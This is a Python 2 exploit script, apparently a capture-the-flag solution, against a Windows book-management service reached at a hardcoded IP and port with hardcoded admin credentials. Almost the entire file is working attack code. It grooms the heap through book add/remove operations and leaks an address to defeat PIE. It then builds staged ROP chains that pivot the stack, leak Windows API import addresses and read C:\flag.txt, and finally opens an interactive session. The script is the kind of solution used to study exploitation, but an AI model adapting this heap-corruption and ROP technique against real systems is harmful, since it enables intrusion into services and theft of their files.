import socket
import struct
import time
import telnetlib

def p(x):
    return struct.pack('<I', x)

def up(x):
    return struct.unpack('<I', x)[0]

def readuntil(f, delim='msg?\n'):
    d = ''
    while not d.endswith(delim):
        n = f.read(1)
        if len(n) == 0:
            print 'EOF'
            break
        d += n
    return d[:-len(delim)]

def login(f):
	readuntil(f, 'id : ')
	f.write('helloadmin\n')
	readuntil(f, 'pw : ')
	f.write('Iulover!@#\n')

def read_menu(f):
	readuntil(f, '> ')

def add_book(f, bookname='1', description='1', stoke='1', price='1', free_ship='1'):
	read_menu(f)
	f.write('1\n')
	readuntil(f, 'E-Book')
	f.write('1\n')
	readuntil(f, 'Bookname?')
	f.write(bookname + '\n')
	readuntil(f, 'Description?')
	f.write(description + '\n')
	readuntil(f, 'Stoke?')
	f.write(stoke + '\n')
	readuntil(f, 'Price?')
	f.write(price + '\n')
	readuntil(f, 'Shipping?')
	f.write(free_ship + '\n')

def add_ebook(f, bookname='2', description='2', stoke='2', price='2', max_download='2'):
	read_menu(f)
	f.write('1\n')
	readuntil(f, 'E-Book')
	f.write('2\n')
	readuntil(f, 'Bookname?')
	f.write(bookname + '\n')
	readuntil(f, 'Description?')
	f.write(description + '\n')
	readuntil(f, 'Stoke?')
	f.write(stoke + '\n')
	readuntil(f, 'Price?')
	f.write(price + '\n')
	readuntil(f, 'Download?')
	f.write(max_download + '\n')

def modify_available(f, index):
	read_menu(f)
	f.write('2\n')
	readuntil(f, 'Index')
	f.write(str(index) + '\n')
	readuntil(f, 'Select Menu : ')
	f.write('4\n')
	readuntil(f, 'Available?')
	f.write('0\n')
	readuntil(f, 'Select Menu : ')
	f.write('0\n')

def remove_book(f, index):
	read_menu(f)
	f.write('3\n')
	readuntil(f, 'Index')
	f.write(str(index) + '\n')

def modify_description(f, index, description):
	read_menu(f)
	f.write('2\n')
	readuntil(f, 'Index')
	f.write(str(index) + '\n')
	readuntil(f, 'Select Menu : ')
	f.write('2\n')
	readuntil(f,'Description?')
	f.write(description + '\n')
	readuntil(f, 'Select Menu : ')
	f.write('0\n')

host = '192.168.165.217'
port = 1337

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
f = s.makefile('rw', bufsize=0)

login(f)
add_ebook(f) # 0
add_ebook(f) # 1
add_ebook(f) # 2
modify_available(f, 0)
modify_available(f, 1)
modify_available(f, 2)
remove_book(f, 0)
remove_book(f, 1)
remove_book(f, 2)

add_book(f) # 3
add_book(f) # 4
add_book(f) # 5
add_book(f) # 6

# bypass PIE
read_menu(f)
f.write('4\n')
readuntil(f, 'Index')
f.write('2\n') # 2
readuntil(f, 'Price : ')
recv = readuntil(f, '\n[*]')
func_1bb0 = int(recv, 10)
binary_base = func_1bb0 - 0x1bb0

print 'func_1bb0: %s' % hex(func_1bb0)
#raw_input('wait')

remove_book(f, 3)
remove_book(f, 4)
remove_book(f, 5)
remove_book(f, 6)

add_book(f) # 7
add_book(f) # 8
add_book(f) # 9
add_book(f) # 10

pivot_pop2_ret = binary_base + 0x1e97
add_esp_1c_ret = binary_base + 0xd1be
data_buf = binary_base + 0x171c0
pop_ret = binary_base + 0x1451
CreateFile_iat = binary_base + 0x10100
read = binary_base + 0x1460
pop2_ret = binary_base + 0x1e98
stage2_base = data_buf + 0x2000
leave_ret = binary_base + 0x1b59
ReadFile_iat = binary_base + 0x100e4
stage3_base = stage2_base + 0x100
CloseHandle_iat = binary_base + 0x100fc

stage2 = p(0x41414141) # PAD
stage2 += p(func_1bb0)
stage2 += p(pop_ret) 
stage2 += p(CreateFile_iat) 
stage2 += p(func_1bb0)
stage2 += p(pop_ret)
stage2 += p(ReadFile_iat)
stage2 += p(func_1bb0)
stage2 += p(pop_ret)
stage2 += p(CloseHandle_iat)
stage2 += p(read)
stage2 += p(pop2_ret)
stage2 += p(stage3_base)
stage2 += p(0x100)
stage2 += p(pop_ret)
stage2 += p(stage3_base)
stage2 += p(leave_ret)
stage2 += p(0x41414141) # pad

rop = 'A' * 8 # pad
rop += p(read) #p(func_1bb0)
rop += p(pop2_ret)
rop += p(stage2_base) 
rop += p(len(stage2) + 1)
rop += p(pop_ret)
rop += p(stage2_base)
rop += p(leave_ret)
rop += p(0x41414141) # PAD ebp
rop += '\x43\x00\x3a\x00' # C:
rop += '\x5c\x00\x66\x00' # \f
rop += '\x6c\x00\x61\x00' # la
rop += '\x67\x00\x2e\x00' # g.
rop += '\x74\x00\x78\x00' # tx
rop += '\x74\x00\x00\x00' # t
rop += '\x00\x00\x00\x00' 

modify_description(f, 7, rop)
modify_available(f, 7)
modify_available(f, 8)
modify_available(f, 9)
modify_available(f, 10)
remove_book(f, 7)
remove_book(f, 8)
remove_book(f, 9)
remove_book(f, 10)

add_ebook(f) # 11
add_ebook(f) # 12
fake_func_ptr = pivot_pop2_ret
add_ebook(f, 
		bookname='1', 
		description='1', 
		stoke=str(data_buf), # eax 
		price=str(fake_func_ptr), 
		max_download=str(add_esp_1c_ret)) # 13
add_book(f,
		bookname='1',
		description='1',
		stoke='1',
		price=str(pivot_pop2_ret),
		free_ship='1') # 14

read_menu(f)
f.write('4\n')
readuntil(f, 'Index')
f.write('10\n') # trigger the bug

import time
time.sleep(0.1)
raw_input('stop1')
f.write(stage2)
readuntil(f, 'Description : ')
recv = readuntil(f, '\n')
CreateFile = up(recv.ljust(4, '\x00')[0:4])
print 'CreateFile: %s' % hex(CreateFile)

readuntil(f, 'Description : ')
recv = readuntil(f, '\n')
ReadFile = up(recv.ljust(4, '\x00')[0:4])
print 'ReadFile: %s' % hex(ReadFile)

readuntil(f, 'Description : ')
recv = readuntil(f, '\n')
CloseHandle = up(recv.ljust(4, '\x00')[0:4])
print 'CloseHandle: %s' % hex(CloseHandle) 

add_esp_1c_pop_ret = binary_base + 0xd138
pop_ecx_ret = binary_base + 0x255a
write_pop2_ret = binary_base + 0x9c10
add_esp_14_ret = binary_base + 0x428d
ret = binary_base + 0x47ef
pop_edi_esi_ebp_ret = binary_base + 0x5468

stage3 = p(0x42424222)
stage3 += p(CreateFile)
stage3 += p(pop_ecx_ret)
stage3 += p(data_buf + 40) # flag.txt
stage3 += p(0x80000000)
stage3 += p(0x1)
stage3 += p(0x0)
stage3 += p(0x3)
stage3 += p(0x0)
stage3 += p(0x0)
stage3 += p(stage3_base + 21 * 4)
stage3 += p(write_pop2_ret)
stage3 += p(0x41414141)
stage3 += p(0x41414141)
stage3 += p(pop_ecx_ret)
stage3 += p(stage3_base + 28 * 4)
stage3 += p(write_pop2_ret)
stage3 += p(0x41414141) # PAD
stage3 += p(0x41414141) # PAD
stage3 += p(ReadFile) # PAD
stage3 += p(ret)
stage3 += p(0x0) # hFile
stage3 += p(data_buf)
stage3 += p(0x20) # size
stage3 += p(data_buf + 0x100) # number_read
stage3 += p(0x0)
stage3 += p(CloseHandle)
stage3 += p(pop_edi_esi_ebp_ret)
stage3 += p(0) # hFile
stage3 += p(0)
stage3 += p(0)
stage3 += p(0)
stage3 += p(read)
stage3 += p(pop2_ret)
stage3 += p(stage2_base)
stage3 += p(0x100)
stage3 += p(pop_ret)
stage3 += p(stage2_base)
stage3 += p(leave_ret)

time.sleep(0.1)
#raw_input('wait')
f.write(stage3 + '\n')

stage4 = p(0x47474747)
stage4 += p(func_1bb0)
stage4 += p(0x47474747)
stage4 += p(data_buf)

time.sleep(0.1)
f.write(stage4 + '\n')
#print f.read(1024)

t = telnetlib.Telnet()
t.sock = s
t.interact()
